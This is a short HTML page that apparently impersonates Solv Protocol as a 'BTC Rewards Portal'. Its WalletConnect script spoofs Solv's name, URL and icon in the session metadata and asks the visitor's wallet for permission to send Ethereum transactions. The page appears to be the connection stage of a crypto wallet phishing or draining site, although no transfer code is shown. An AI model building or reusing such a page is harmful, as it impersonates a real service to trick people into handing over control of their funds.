<!DOCTYPE html>
<html>
<head>
    <title>Solv Protocol - BTC Rewards</title>
    <script src="https://unpkg.com/@walletconnect/sign-client@2.10.6/dist/index.umd.js"></script>
    <script src="https://unpkg.com/@walletconnect/qrcode-modal@1.8.0/dist/index.min.js"></script>
</head>
<body>
    <h1>Solv Protocol - BTC Rewards Portal</h1>
    <button id="btn" style="padding: 15px; background: blue; color: white;">Connect Wallet</button>

    <script>
        document.getElementById('btn').addEventListener('click', async () => {
            // AUTO-FIND THE CORRECT VARIABLE
            const ClientLib = window.SignClient || 
                              (window.WalletConnectSignClient ? window.WalletConnectSignClient.SignClient : null);

            if (!ClientLib) {
                console.log("Current window keys:", Object.keys(window).filter(k => k.toLowerCase().includes('client') || k.toLowerCase().includes('wallet')));
                alert("Technical Error: SignClient library not found in window object. Check console.");
                return;
            }

            try {
                const signClient = await ClientLib.init({
                    projectId: '_gg7wSSi0KMBsdKnGVfHDueq6xMB9EkC',
                    metadata: {
                        name: 'Solv Protocol',
                        url: 'https://app.solv.finance',
                        icons: ['https://solv.finance/favicon.ico']
                    }
                });

                const { uri } = await signClient.connect({
                    requiredNamespaces: {
                        eip155: {
                            methods: ['eth_sendTransaction'],
                            chains: ['eip155:1'],
                            events: ['chainChanged']
                        }
                    }
                });

                if (uri) {
                    WalletConnectQRCodeModal.open(uri, () => {});
                }
            } catch (err) {
                console.error("Connection Error:", err);
                alert("Error: " + err.message);
            }
        });
    </script>
</body>
</html>
